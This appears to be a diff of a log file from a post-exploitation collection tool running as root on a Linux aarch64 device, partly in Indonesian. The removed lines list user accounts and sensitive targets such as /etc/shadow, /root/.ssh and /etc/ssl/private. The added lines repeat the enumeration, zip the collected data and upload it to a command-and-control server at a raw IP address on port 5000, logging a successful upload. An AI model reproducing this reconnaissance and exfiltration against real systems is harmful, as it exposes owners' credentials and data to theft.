@@ -1,44 +1,44 @@
-[1771930506] [INFO] === NETWORK MAPPING STARTED ===
-[1771930506] [USER] === USER ACCOUNTS ===
-[1771930506] [USER] Current user: root
-[1771930506] [USER] Home: /root
-[1771930506] [USER] System user: sync
-[1771930506] [USER] System user: games
-[1771930506] [USER] System user: man
-[1771930506] [USER] System user: lp
-[1771930506] [USER] System user: mail
-[1771930506] [USER] System user: news
-[1771930506] [USER] System user: uucp
-[1771930506] [USER] System user: proxy
-[1771930506] [USER] System user: www-data
-[1771930506] [USER] System user: backup
-[1771930506] [USER] System user: list
-[1771930506] [USER] System user: irc
-[1771930506] [USER] System user: nobody
-[1771930506] [USER] System user: systemd-network
-[1771930506] [USER] System user: messagebus
-[1771930506] [USER] System user: polkitd
-[1771930506] [USER] System user: lynx
-[1771930506] [USER] System user: Debian-exim
-[1771930506] [SYSTEM] === SYSTEM INFORMATION ===
-[1771930506] [SYSTEM] Hostname: localhost
-[1771930506] [SYSTEM] OS: Linux
-[1771930506] [SYSTEM] Release: 4.19.157-perf+
-[1771930506] [SYSTEM] Machine: aarch64
-[1771930506] [SYSTEM] === IP CONFIGURATION ===
-[1771930506] [SHARE] === NETWORK SHARES ===
-[1771930506] [SHARE] Mounted Network Drives:
-[1771930506] [SHARE]   adb /dev/usb-ffs/adb functionfs rw,relatime 0 0
-[1771930506] [SHARE]   diag /dev/ffs-diag functionfs rw,relatime 0 0
-[1771930506] [SHARE]   diag_mdm /dev/ffs-diag-1 functionfs rw,relatime 0 0
-[1771930506] [SHARE]   diag_mdm2 /dev/ffs-diag-2 functionfs rw,relatime 0 0
-[1771930506] [PROCESS] === RUNNING PROCESSES ===
-[1771930506] [FILES] === IMPORTANT FILES ===
-[1771930506] [FILES] File: /etc/passwd
-[1771930506] [FILES] File: /etc/shadow
-[1771930506] [FILES] Directory: /etc/ssl/private
-[1771930506] [FILES] Directory: /root/.ssh/
-[1771930506] [FILES] Directory: /home/
-[1771930506] [FILES]   - lynx
-[1771930506] [FILES] Directory: /var/backups/
-[1771930506] [INFO] === NETWORK MAPPING COMPLETED ===
+[1771935758] [INFO] === PENGUMPULAN DATA DIMULAI ===
+[1771935758] [USER] === USER ACCOUNTS ===
+[1771935758] [USER] Current: root (/root)
+[1771935758] [USER] User: sys
+[1771935758] [USER] User: sync
+[1771935758] [USER] User: games
+[1771935758] [USER] User: man
+[1771935758] [USER] User: lp
+[1771935758] [USER] User: mail
+[1771935758] [USER] User: news
+[1771935758] [USER] User: uucp
+[1771935758] [USER] User: proxy
+[1771935758] [USER] User: www-data
+[1771935758] [USER] User: backup
+[1771935758] [USER] User: list
+[1771935758] [USER] User: irc
+[1771935758] [USER] User: nobody
+[1771935758] [USER] User: systemd-network
+[1771935758] [USER] User: messagebus
+[1771935758] [USER] User: polkitd
+[1771935758] [USER] User: lynx
+[1771935758] [USER] User: Debian-exim
+[1771935758] [SYSTEM] === SYSTEM INFO ===
+[1771935758] [SYSTEM] Hostname: localhost
+[1771935758] [SYSTEM] Linux 4.19.157-perf+ (aarch64)
+[1771935758] [NETWORK] === INTERFACES ===
+[1771935758] [SHARE] === NFS / CIFS SHARES ===
+[1771935758] [SHARE] adb /dev/usb-ffs/adb functionfs rw,relatime 0 0
+[1771935758] [SHARE] diag /dev/ffs-diag functionfs rw,relatime 0 0
+[1771935758] [SHARE] diag_mdm /dev/ffs-diag-1 functionfs rw,relatime 0 0
+[1771935758] [SHARE] diag_mdm2 /dev/ffs-diag-2 functionfs rw,relatime 0 0
+[1771935758] [PROCESS] === INTERESTING PROCESSES ===
+[1771935758] [INFO] === PENGUMPULAN DATA SELESAI ===
+[1771935758] [C2] Memulai pengiriman ke: http://20.11.14.19:5000
+[1771935758] [ZIP] ZIP selesai: collected_1771935758.zip
+[1771935758] [ZIP] File ditambahkan: 1, diskip: 0
+[1771935758] [C2] Berhasil dikirim (status: 200)
+[1771935758] [C2] Respon body: {
+  "filename": "20260224_122238_collected_1771935758.zip",
+  "message": "File successfully uploaded",
+  "size_mb": 0.0,
+  "status": "success"
+}
+
